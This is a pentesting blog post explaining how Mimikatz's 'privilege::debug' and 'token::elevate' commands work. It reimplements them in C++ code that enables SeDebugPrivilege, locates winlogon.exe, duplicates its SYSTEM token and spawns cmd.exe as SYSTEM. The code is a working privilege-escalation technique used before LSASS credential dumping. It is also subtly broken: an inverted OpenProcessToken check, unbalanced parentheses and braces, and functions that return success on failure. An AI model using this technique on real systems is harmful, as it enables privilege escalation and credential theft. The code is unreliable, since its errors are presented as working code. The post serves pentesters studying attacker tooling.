---
title: "How MIMIKATZ becomes SYSTEM"
layout: "post"
categories: "Windows"
tags: ["Research", "Pentesting", "Privilege Escalation", "Access Token"]
---

In this post I would like to shine a spotlight on a pretty overlooked feature of [Mimikatz](https://github.com/gentilkiwi/mimikatz).

Mimikatz facilitates password hash extraction from the [Local Security Authority Subsystem (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). Since LSASS is a privileged process running under the `SYSTEM` user, we must launch mimikatz from an administrative command prompt. To extract password hashes, we must first execute two commands. The first is `privilege::debug`, which enables the `SeDebugPrivilge` access right required to tamper with another process. If this commands fails, mimikatz was most likely not executed with administrative privileges.

It's important to understand that LSASS is a `SYSTEM` process, which means it has even higher privileges than mimikatz running with administrative privileges. To address this, we can use the `token::elevate` command to elevate the security token from high integrity (administrator) to `SYSTEM` integrity. If mimikatz is launched from a `SYSTEM` shell, this step is not required. 

```batch
mimikatz # privilege::debug
mimikatz # token::elevate
```
I am saying that these two commands are usually overlooked because they aren't the actual juicy part about Mimikatz and can be just learned by heart. However, these two commands hide a great technique that allows to escalate privileges from Local Administrator to `SYSTEM`.



## Debug Privilege
The first two of these commands is successful if we receive the following output.
```batch
mimikatz # privilege::debug
Privilege '20' OK
```

If we don't receive this output it simply means that we aren't a Local Administrator yet (you do not have the required privilege to run the command) and this is the error we'll get:
```batch
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```


The name of this command and the associated result are not arbitrary. This command is allowing Mimikatz to use `AdjustTokenPrivileges()` to adjust its process security access token. The requested privilege name is `SeDebugPrivilege` privilege (which has value `0x10` or `20`).

> SeDebugPrivilege: Required to debug and adjust the memory of a process owned by another account.

## Privilege Escalation

The access token to be adjusted is obtained using a call to `OpenProcessToken()` and passing its process handle (obtained using `GetCurrentProcess()`), and the desired access (in this case, to query and adjust privileges) are passed in.

Mimikatz will call `LookupPrivilegeValueW()` which retrieves the [locally unique identifier](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid) (LUID). The LUID is a structure that the local system uses to identify the privilege (in this case, the `SeDebugPrivilege`).

The information retrieved using `LookupPrivilegeValueW()` and `OpenProcessToken()` is used in the call to `AdjustTokenPrivileges()` in order to enable the `SeDebugPrivilege`.

```cpp
BOOL Enable_SeDebugPrivilege( ) {
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)
    {
        printf("OpenProcessToken error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    if ( !LookupPrivilegeValueW( 
            NULL,                   // lookup privilege on local system
            L"SeDebugPrivilege",    // privilege to lookup 
            &luid ) )               // receives LUID of privilege
    {
        printf("LookupPrivilegeValueW error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Enable the privilege.
    if ( !AdjustTokenPrivileges(
           hToken, 
           FALSE, 
           &tp, 
           sizeof(TOKEN_PRIVILEGES), 
           (PTOKEN_PRIVILEGES) NULL, 
           (PDWORD) NULL) )
    { 
          printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
          printf("The token does not have the specified privilege. \n");
          return FALSE;
    } 

    return TRUE;
}
```
This combination of calls more than often happens before system process manipulation code, to perform [process injection](https://attack.mitre.org/techniques/T1055/#:~:text=Process%20injection%20is%20a%20method,resources%2C%20and%20possibly%20elevated%20privileges.) or SYSTEM token impersonation. Either way the result will be the same.

## Impersonate a `SYSTEM` token

After the Debug privilege is enabled we need to create a process with `SYSTEM` level privileges by duplicating the Primary Token of a process running under the security context of `SYSTEM` (in our case this process will be [`Winlogon.exe`](https://github.com/carlospolop/hacktricks/blob/master/forensics/basic-forensic-methodology/windows-forensics/windows-processes.md#winlogonexe)).

This is what mimikatz will do when we issue the command:
```batch
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

752     {0;000003e7} 0 D 44299          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;002cfce0} 4 F 62374281    akatsuki\0b1to        S-1-5-21-2725560159-1428537199-2260736313-1730  (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 0 D 62721950    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
```

Mimikatz uses the Windows API calls `CreateToolhelp32Snapshot()`, `Process32FirstW()` and `Process32NextW()` to search the process list for the Winlogon process PID. 

```cpp
BOOL GetWinlogonPid( )
{
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;

  // Take a snapshot of all processes in the system.
  hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0 );
  if( hProcessSnap == INVALID_HANDLE_VALUE )
  {
    printError( TEXT("CreateToolhelp32Snapshot (of processes)") );
    return( FALSE );
  }

  // Set the size of the structure before using it.
  pe32.dwSize = sizeof( PROCESSENTRY32 );

  // Retrieve information about the first process,
  if( !Process32First( hProcessSnap, &pe32 ) )
  {
    printError( TEXT("Process32First") ); // show cause of failure
    CloseHandle( hProcessSnap );          // clean the snapshot object
    return( FALSE );
  }

  // Now walk the snapshot of processes
  do
  {
      if(_stricmp(pe32.szExeFile, "winlogon.exe") == 0))
      {
          return pe32.th32ProcessID;
      } 
  } while( Process32Next( hProcessSnap, &pe32 ) );

  CloseHandle( hProcessSnap );
  return( TRUE );
}

```

Once the Winlogon PID is found there is the need to open the Process Handle of this `SYSTEM` level process (in our case, `Winlogon.exe`). Following, we can open a Process Token from the already opened Process Handle using `OpenProcessToken()`. The Token Handle will be duplicated using `DuplicateTokenEx()` function and handed to a newly created `HANDLE`. After the Duplication process of the token is done, we will create a new process using the newly duplicated token. To create a new process with this token we will use the `CreateProcessWithTokenW()` function.

```cpp
BOOL SpawnShell( int WinlogonPid )
{
    HANDLE hAccessToken = NULL;
    HANDLE hToken = NULL;
    HANDLE NewToken = NULL;

    SECURITY_IMPERSONATION_LEVEL se_impersonate_level = SecurityImpersonation;
    TOKEN_TYPE token_type = TokenPrimary;

    STARTUPINFOEX startup_info = {};
    PROCESS_INFORMATION process_info = {};

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, WinlogonPid);
    if (hProcess)
    {
        if (OpenProcessToken(hProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
        {
            if (DuplicateTokenEx(hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_ALL_ACCESS, NULL, se_impersonate_level, token_type, &NewToken))
            {
                if (CreateProcessWithTokenW(NewToken, 0, L"C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startup_info, &process_info))
                    return( TRUE );
                    
                }
            }
            CloseHandle(hToken);
        }
        CloseHandle(hProcess);
    }

    return( TRUE );
}
```
## Conclusion
In this blog I didn't show any new technique however I wanted to show some of the techniques that MIMIKATZ uses under the hood to achieve `SYSTEM` level privileges starting from a process running under Local Administrator Privileges. 

Obviously Mimikatz is more complicated than this and one can specify different options that will modify the default behaviour that has been described in this post.

I hope that this post helped you to uncover some of the commands that are usually overlooked while using Mimikatz but in reality hide a great technique.

## References
- [Enabling and Disabling Privileges in C++](https://learn.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--)
- [Taking a Snapshot and Viewing Processes](https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)
- [Token Manipulation Attacks – Part 2 (Process of Impersonation)](https://niiconsulting.com/checkmate/2019/11/token-manipulation-attacks-part-2-process-of-impersonation/)
- [MimiRust](https://github.com/memN0ps/mimikatz-rs#mimirust---hacking-the-windows-operating-system-to-hand-us-the-keys-to-the-kingdom-with-rust)